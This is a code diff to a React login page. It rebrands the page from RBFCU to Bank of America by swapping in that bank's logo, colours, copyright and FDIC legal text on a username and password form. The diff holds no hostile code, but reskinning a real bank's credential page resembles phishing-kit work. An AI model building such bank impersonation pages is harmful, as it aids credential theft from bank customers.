@@ -50,28 +50,27 @@ export const Login: React.FC<LoginProps> = ({ onLoginSuccess }) => {
 
 
   return (
-    <div className="min-h-screen bg-gradient-to-br from-blue-900 via-blue-800 to-[#1e3a8a] flex items-center justify-center p-6 relative overflow-hidden">
+    <div className="min-h-screen bg-gradient-to-br from-boa-blue-900 via-boa-blue-800 to-boa-blue-700 flex items-center justify-center p-6 relative overflow-hidden">
       {/* Enhanced Background Pattern */}
       <div className="absolute inset-0 overflow-hidden">
-        <div className="absolute -bottom-1/2 -left-1/4 w-96 h-96 bg-gradient-to-r from-blue-400/40 to-[#1e3a8a]/40 rounded-full blur-3xl animate-pulse"></div>
-        <div className="absolute -top-1/2 -right-1/4 w-96 h-96 bg-gradient-to-r from-blue-300/40 to-blue-500/40 rounded-full blur-3xl animate-pulse"></div>
-        <div className="absolute top-1/4 left-1/3 w-64 h-64 bg-gradient-to-r from-[#1e3a8a]/30 to-blue-400/30 rounded-full blur-2xl animate-bounce-subtle"></div>
-        <div className="absolute bottom-1/3 right-1/4 w-48 h-48 bg-gradient-to-r from-blue-500/30 to-[#1e3a8a]/30 rounded-full blur-xl animate-pulse"></div>
+        <div className="absolute -bottom-1/2 -left-1/4 w-96 h-96 bg-gradient-to-r from-boa-blue-400/40 to-boa-blue-800/40 rounded-full blur-3xl animate-pulse"></div>
+        <div className="absolute -top-1/2 -right-1/4 w-96 h-96 bg-gradient-to-r from-boa-blue-300/40 to-boa-blue-500/40 rounded-full blur-3xl animate-pulse"></div>
+        <div className="absolute top-1/4 left-1/3 w-64 h-64 bg-gradient-to-r from-boa-blue-800/30 to-boa-blue-400/30 rounded-full blur-2xl animate-bounce-subtle"></div>
+        <div className="absolute bottom-1/3 right-1/4 w-48 h-48 bg-gradient-to-r from-boa-blue-500/30 to-boa-blue-800/30 rounded-full blur-xl animate-pulse"></div>
       </div>
 
       <div className="relative w-full max-w-md animate-fade-in">
-        {/* Enhanced Logo */}
+        {/* Bank of America Logo */}
         <div className="text-center mb-10">
-          <div className="inline-flex items-center justify-center mb-8">
-            <img src="/rbfcu-logo.svg" alt="RBFCU  Online Logo" className="h-24" />
+          <div className="inline-flex items-center justify-center mb-8 bg-white rounded-2xl p-6 shadow-2xl">
+            <img src="/bank-of-america-logo.svg" alt="Bank of America Online Banking" className="h-16 w-auto" />
           </div>
-          <p className="text-blue-100 text-lg font-medium drop-shadow-lg">Secure access to your financial future</p>
         </div>
 
 
 
         {/* Enhanced Login Form */}
-        <div className="bg-gradient-to-br from-blue-800/70 to-[#1e3a8a]/70 backdrop-blur-xl rounded-3xl p-8 shadow-2xl border border-blue-400/30 animate-slide-up">
+        <div className="bg-gradient-to-br from-boa-blue-800/70 to-boa-blue-900/70 backdrop-blur-xl rounded-3xl p-8 shadow-2xl border border-boa-blue-400/30 animate-slide-up">
           <form onSubmit={handleSubmit} className="space-y-6">
             {/* Error Message */}
             {error && (
@@ -92,7 +91,7 @@ export const Login: React.FC<LoginProps> = ({ onLoginSuccess }) => {
                   value={username}
                   onChange={(e) => setUsername(e.target.value)}
                   placeholder="Username"
-                  className="w-full bg-gradient-to-r from-[#1e3a8a]/60 to-blue-800/60 border-2 border-blue-400/40 rounded-2xl px-14 py-4 text-white placeholder-blue-200 focus:bg-blue-800/70 focus:border-blue-300/60 focus:outline-none transition-all-smooth font-medium backdrop-blur-sm"
+                  className="w-full bg-gradient-to-r from-boa-blue-900/60 to-boa-blue-800/60 border-2 border-boa-blue-400/40 rounded-2xl px-14 py-4 text-white placeholder-blue-200 focus:bg-boa-blue-800/70 focus:border-boa-blue-300/60 focus:outline-none transition-all-smooth font-medium backdrop-blur-sm"
                   required
                 />
               </div>
@@ -107,7 +106,7 @@ export const Login: React.FC<LoginProps> = ({ onLoginSuccess }) => {
                   value={password}
                   onChange={(e) => setPassword(e.target.value)}
                   placeholder="Password"
-                  className="w-full bg-gradient-to-r from-[#1e3a8a]/60 to-blue-800/60 border-2 border-blue-400/40 rounded-2xl px-14 py-4 pr-16 text-white placeholder-blue-200 focus:bg-blue-800/70 focus:border-blue-300/60 focus:outline-none transition-all-smooth font-medium backdrop-blur-sm"
+                  className="w-full bg-gradient-to-r from-boa-blue-900/60 to-boa-blue-800/60 border-2 border-boa-blue-400/40 rounded-2xl px-14 py-4 pr-16 text-white placeholder-blue-200 focus:bg-boa-blue-800/70 focus:border-boa-blue-300/60 focus:outline-none transition-all-smooth font-medium backdrop-blur-sm"
                   required
                 />
                 <button
@@ -164,9 +163,9 @@ export const Login: React.FC<LoginProps> = ({ onLoginSuccess }) => {
 
         {/* Legal Text */}
         <div className="text-center mt-8 space-y-2">
-          <p className="text-blue-200 text-sm font-medium drop-shadow-lg">© 2024 RBFCU  Online </p>
+          <p className="text-blue-200 text-sm font-medium drop-shadow-lg">© 2024 Bank of America Corporation</p>
           <p className="text-blue-300 text-xs drop-shadow-lg">
-            Member FDIC. All Rights Reserved.
+            Member FDIC. Equal Housing Lender. All Rights Reserved.
           </p>
         </div>
       </div>
